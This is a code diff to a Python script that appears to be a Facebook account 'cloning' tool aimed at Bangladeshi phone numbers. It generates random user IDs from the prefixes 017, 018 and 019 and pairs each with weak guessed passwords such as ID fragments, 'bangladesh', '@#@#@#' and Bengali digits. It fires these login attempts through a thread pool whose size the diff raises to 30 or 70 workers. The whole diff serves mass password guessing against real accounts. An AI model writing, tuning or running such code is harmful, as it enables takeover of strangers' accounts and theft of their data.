@@ -438,7 +438,7 @@ def ran():
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]01701819458")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]017, 018, 019")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
@@ -446,7 +446,7 @@ def ran():
         print(sort.line())
 
         for i in range(limit):
-            data = str(int(code) + i)
+            data = str(random.choice(range(10000000, 99999999)))
             user.append(data)
     print(" Method 1(Best)")
     print(" Method 2")
@@ -469,9 +469,9 @@ def ran():
     else:
         fb = "m"
     if meth in ["1", "a", "A"]:
-    	mw = 10
+    	mw = 30
     else:
-    	mw = 50
+    	mw = 70
     with ThreadPool(max_workers=mw) as heron:
         sort.clear()
         sort.logo()
@@ -479,11 +479,11 @@ def ran():
         print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
         print(sort.line())
         for xd in user:
-            uid = "0" + xd
+            uid = code + xd
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]
+                pwx = [uid, uid[:6], uid[:8], xd, xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
